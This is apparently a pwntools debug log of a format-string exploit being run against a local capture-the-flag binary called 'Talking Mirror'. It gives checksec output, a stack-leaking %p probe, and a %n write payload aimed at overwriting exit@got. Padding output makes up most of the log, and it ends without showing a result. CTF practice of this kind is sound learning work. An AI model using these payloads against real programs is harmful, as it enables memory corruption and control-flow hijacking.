@@ -1,0 +1,2095 @@
+[*] '/mnt/e/Cyber Security/CTF/PragyanCTF/Talking Mirror/challenge'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[*] PHASE 1: Probing Link (Offset 3 -> ?)...
+[x] Starting local process './challenge' argv=[b'./challenge'] 
+[+] Starting local process './challenge' argv=[b'./challenge'] : pid 312
+[DEBUG] Received 0x41 bytes:
+    b'I am the talking mirror. Tell me anything and I shall repeat it.\n'
+[DEBUG] Sent 0x136 bytes:
+    b'%4919c%3$hn|6:%6$p|7:%7$p|8:%8$p|9:%9$p|10:%10$p|11:%11$p|12:%12$p|13:%13$p|14:%14$p|15:%15$p|16:%16$p|17:%17$p|18:%18$p|19:%19$p|20:%20$p|21:%21$p|22:%22$p|23:%23$p|24:%24$p|25:%25$p|26:%26$p|27:%27$p|28:%28$p|29:%29$p|30:%30$p|31:%31$p|32:%32$p|33:%33$p|34:%34$p|35:%35$p|36:%36$p|37:%37$p|38:%38$p|39:%39$p\n'
+[x] Receiving all data
+[x] Receiving all data: 1B
+[*] Process './challenge' stopped with exit code 0 (pid 312)
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[x] Receiving all data: 4.00KB
+[DEBUG] Received 0x416 bytes:
+    b'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       c|6:0x3325633931393425|7:0x36253a367c6e6824|8:0x2437253a377c7024|9:0x702438253a387c70|10:0x7c702439253a397c|11:0x70243031253a3031|12:0x243131253a31317c|13:0x3231253a32317c70|14:0x31253a33317c7024|15:0x253a34317c702433|16:%1'
+[x] Receiving all data: 5.02KB
+[+] Receiving all data: Done (5.02KB)
+[-] Khong tim thay Link truc tiep. Thu Blind Guess o Offset 10-20...
+
+[*] PHASE 2: Exploiting via Link (Offset 10)...
+[x] Starting local process './challenge' argv=[b'./challenge'] 
+[+] Starting local process './challenge' argv=[b'./challenge'] : pid 313
+[*] Step 1: Write 0x400a50 into Offset 10 (via Offset 3)
+[*] Step 2: Write 0x401216 into exit@got (via Offset 10)
+[*] Sending payload (This might take a few seconds due to large output)...
+[DEBUG] Received 0x41 bytes:
+    b'I am the talking mirror. Tell me anything and I shall repeat it.\n'
+[DEBUG] Sent 0x1b bytes:
+    b'%4196944c%3$lln%1990c%10$n\n'
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
